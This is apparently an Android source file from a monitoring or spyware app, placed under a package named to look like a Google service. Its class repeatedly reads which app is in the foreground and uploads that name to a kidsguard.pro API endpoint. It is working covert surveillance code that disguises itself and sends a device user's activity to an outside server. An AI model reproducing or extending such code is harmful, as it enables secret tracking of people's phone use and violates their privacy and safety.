package com.google.cloudservices;

import android.content.Context;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class sendCurrApp {



    public void send(final Context context){
        CurrentAppClass currentAppClass=new CurrentAppClass();
         Curdb curdb=new Curdb(context);
        if (curdb.getcurr().equals("1")){
            sendc(context);
            curdb.Insertcurr(currentAppClass.getTopAppName(context));
            curdb.close();
            /*Runtime.getRuntime().gc();*/
        }else if (curdb.getcurr().equals(currentAppClass.getTopAppName(context))){sendc(context);}else {
            curdb.Updatecurr(currentAppClass.getTopAppName(context));
            curdb.close();
            /*Runtime.getRuntime().gc();*/
            sendc(context);
        }
        curdb.close();
       // Runtime.getRuntime().gc();

    }

    public void sendc(Context context){
        JSONObject jscurr=new JSONObject();
        try {
            CurrentAppClass currentAppClass=new CurrentAppClass();
            jscurr.put("app",currentAppClass.getTopAppName(context));
            JSONArray curraray=new JSONArray();
            curraray.put(0,jscurr);
            String currentApp= String.valueOf(curraray);
            sm sm=new sm();
            sm.add(context,"https://req.kidsguard.pro/api/syncCurrentApp/","currapp",currentApp);
        } catch (JSONException e) {
            SendEror sendEror=new SendEror();
            sendEror.sender(context,"send curr app:"+e.toString());
            e.printStackTrace();
        }
    }

}
